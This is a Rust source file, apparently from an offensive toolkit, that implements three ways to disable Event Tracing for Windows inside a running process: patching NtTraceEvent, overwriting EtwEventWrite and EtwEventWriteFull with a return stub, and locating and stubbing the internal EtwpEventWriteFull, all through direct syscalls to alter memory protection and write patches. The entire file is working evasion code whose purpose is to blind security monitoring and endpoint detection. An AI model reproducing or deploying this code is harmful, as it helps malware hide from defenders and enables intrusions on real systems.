// =======================================================================================================
// ETW EVASION Techniques
// =======================================================================================================
use std::ffi::c_void;
// =======================================================================================================
// ETW EVASION: NtTraceEvent Patch
// =======================================================================================================

#[cfg(feature = "EvasionETWSimple")]
use windows_sys::Win32::Foundation::HANDLE;
#[cfg(feature = "EvasionETWSimple")]
use windows_sys::Win32::System::LibraryLoader::{GetProcAddress, LoadLibraryA};
#[cfg(feature = "EvasionETWSimple")]
use windows_sys::Win32::System::Threading::GetCurrentProcess;
#[cfg(feature = "EvasionETWSimple")]
use rust_syscalls::syscall;

#[cfg(feature = "EvasionETWSimple")]
pub fn patch_etw() -> bool {
    let patch: [u8; 1] = [0x75];
    
    let ntdll = unsafe { LoadLibraryA(b"ntdll.dll\0".as_ptr()) };
    if ntdll.is_null() {
        return false;
    }

    let mut nt_traceevent = unsafe { GetProcAddress(ntdll, b"NtTraceEvent\0".as_ptr()) };
    if nt_traceevent.is_none() {
        return false;
    }
    
    let mut protectaddress_to_protect: *mut c_void = unsafe {
        std::mem::transmute(nt_traceevent.unwrap())
    };

    let mut size_to_set = patch.len(); 
    let mut return_value: i32;
    let mut process_handle: HANDLE = unsafe { GetCurrentProcess() };
    let mut protect: u32 = 0x40;
    let mut oldprotect: u32 = 0;
    let mut bytes_written: usize = 0;
    
    unsafe
    {
        return_value = syscall!("NtProtectVirtualMemory", process_handle, &mut protectaddress_to_protect, &mut size_to_set, protect, &mut oldprotect);
    }

    let patch_ptr = patch.as_ptr() as *const c_void;
    unsafe
    {
        return_value = syscall!("NtWriteVirtualMemory", process_handle, nt_traceevent, patch_ptr, patch.len(), &mut bytes_written);
    }

    // reprotect page permissions to READ_WRITE
    unsafe
    {
        return_value = syscall!("NtProtectVirtualMemory", process_handle, &mut protectaddress_to_protect, &mut size_to_set, 0x20, &mut oldprotect);
    }

    return true;
}

// =======================================================================================================
// ETW EVASION: WinAPI Event Write Patch
// =======================================================================================================

#[cfg(feature = "EvasionETWWinAPI")]
use windows_sys::Win32::Foundation::HANDLE;
#[cfg(feature = "EvasionETWWinAPI")]
use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress as GetProcAddressWinAPI};
#[cfg(feature = "EvasionETWWinAPI")]
use windows_sys::Win32::System::Threading::GetCurrentProcess;
#[cfg(feature = "EvasionETWWinAPI")]
use rust_syscalls::syscall;

#[cfg(feature = "EvasionETWWinAPI")]
#[derive(Eq, PartialEq)]
pub enum Patch {
    PatchEtwEventWrite,
    PatchEtwEventWriteFull,
}

#[cfg(feature = "EvasionETWWinAPI")]
pub fn patch_etw_write_functions_start(patch: Patch) -> Result<(), &'static str> {
    let func_name: *const u8 = match patch {
        Patch::PatchEtwEventWrite => b"EtwEventWrite\0".as_ptr(),
        Patch::PatchEtwEventWriteFull => b"EtwEventWriteFull\0".as_ptr(),
    };

    unsafe {
        let ntdll_handle = GetModuleHandleA(b"NTDLL.dll\0".as_ptr());

        let etw_fun_address = GetProcAddressWinAPI(ntdll_handle, func_name);

        let mut etw_fun_ptr = etw_fun_address.unwrap() as *mut c_void;

        let patch_shellcode: &[u8] = &[
            0x33, 0xC0, // xor eax, eax
            0xC3,       // ret
        ];

        let mut size_to_set = patch_shellcode.len();
        let mut return_value: i32;
        let process_handle: HANDLE = GetCurrentProcess();
        let mut oldprotect: u32 = 0;
        let mut bytes_written: usize = 0;

        // Change protection to RWX
        return_value = syscall!("NtProtectVirtualMemory", process_handle, &mut etw_fun_ptr, &mut size_to_set, 0x40, &mut oldprotect);

        // Write patch
        let patch_ptr = patch_shellcode.as_ptr() as *const c_void;
        return_value = syscall!("NtWriteVirtualMemory", process_handle, etw_fun_ptr, patch_ptr, patch_shellcode.len(), &mut bytes_written);

        // Restore protection
        return_value = syscall!("NtProtectVirtualMemory", process_handle, &mut etw_fun_ptr, &mut size_to_set, oldprotect, &mut oldprotect);
    }
    Ok(())
}

// =======================================================================================================
// ETW EVASION: EtwpEventWrite Internal Patch
// =======================================================================================================

#[cfg(feature = "EvasionETWpEventWrite")]
use windows_sys::Win32::Foundation::HANDLE;
#[cfg(feature = "EvasionETWpEventWrite")]
use windows_sys::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
#[cfg(feature = "EvasionETWpEventWrite")]
use windows_sys::Win32::System::Threading::GetCurrentProcess;
#[cfg(feature = "EvasionETWpEventWrite")]
use rust_syscalls::syscall;

#[cfg(feature = "EvasionETWpEventWrite")]
const ETW_EVENT_WRITE_SIZE: usize = 0x1000;
#[cfg(feature = "EvasionETWpEventWrite")]
const RET_INT3_OPCODE: &[u8] = 0xCCC3u16.to_le_bytes().as_slice();
#[cfg(feature = "EvasionETWpEventWrite")]
const CALL_OPCODE: u8 = 0xE8;

#[cfg(feature = "EvasionETWpEventWrite")]
pub fn patch_etwp_event_write_full_start() -> Result<(), &'static str> {
    unsafe {
        let ntdll_handle = GetModuleHandleA(b"NTDLL.dll\0".as_ptr());
        let etw_fun_address = GetProcAddress(ntdll_handle, b"EtwEventWrite\0".as_ptr());
        let etw_fun_address = etw_fun_address.unwrap() as *mut u8;

        let etw_event_write_buffer =
            std::slice::from_raw_parts_mut(etw_fun_address, ETW_EVENT_WRITE_SIZE);

        let end = match etw_event_write_buffer
            .windows(RET_INT3_OPCODE.len())
            .position(|w| w == RET_INT3_OPCODE)
        {
            None => return Err("Could not find end of function"),
            Some(x) => x,
        };

        let tmp_address = match etw_event_write_buffer[..end]
            .iter()
            .rposition(|b| *b == CALL_OPCODE)
        {
            None => return Err("Could not find"),
            // Skipping the `E8` byte ('call` opcode)
            Some(a) => &mut etw_event_write_buffer[a + 1] as *mut u8,
        };

        // Fetching EtwpEventWriteFull's offset
        let offset = std::ptr::read_unaligned(tmp_address as *mut u32);

        // Get the absolute address of `EtwpEventWriteFull`
        let etwp_event_write_full = tmp_address.add(std::mem::size_of::<u32>() + offset as usize);

        let patch_shellcode: &[u8] = &[
            0x33, 0xC0, // xor eax, eax
            0xC3,       // ret
        ];

        let mut etwp_ptr = etwp_event_write_full as *mut c_void;
        let mut size_to_set = patch_shellcode.len();
        let mut return_value: i32;
        let process_handle: HANDLE = GetCurrentProcess();
        let mut oldprotect: u32 = 0;
        let mut bytes_written: usize = 0;

        // Change protection to RWX
        return_value = syscall!("NtProtectVirtualMemory", process_handle, &mut etwp_ptr, &mut size_to_set, 0x40, &mut oldprotect);
        // Write patch
        let patch_ptr = patch_shellcode.as_ptr() as *const c_void;
        return_value = syscall!("NtWriteVirtualMemory", process_handle, etwp_ptr, patch_ptr, patch_shellcode.len(), &mut bytes_written);
        // Restore protection
        return_value = syscall!("NtProtectVirtualMemory", process_handle, &mut etwp_ptr, &mut size_to_set, oldprotect, &mut oldprotect);
    }

    Ok(())
}

